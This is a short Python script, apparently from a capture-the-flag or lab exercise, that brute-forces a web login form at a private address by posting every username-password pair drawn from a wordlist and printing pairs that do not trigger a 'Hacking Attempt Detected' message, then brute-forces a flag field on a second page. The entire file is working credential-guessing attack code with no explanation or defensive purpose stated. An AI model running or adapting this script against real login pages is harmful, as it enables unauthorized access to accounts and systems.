import requests
lines = []

with open("raft-small-words.txt","r") as raft:
        lines = raft.readlines()

s = requests.Session()

for user in lines:
        for password in lines:
                credentials = {
                'login_field':user.strip(),
                'cred_field':password.strip()
                }

                response = s.post('http://172.25.0.32/check.php', data=credentials)
                currentPageText = response.text
                if "Hacking Attempt Detected" not in currentPageText:
                        print(credentials)
for i in lines:
        mydata = {'new_flag':i.replace("\n","")}
        response2 = s.post('http://172.25.0.32/hackme.php', data=mydata)
        currentPageText = response2.text
        if "brute-force" not in currentPageText:
                print(response2.text)








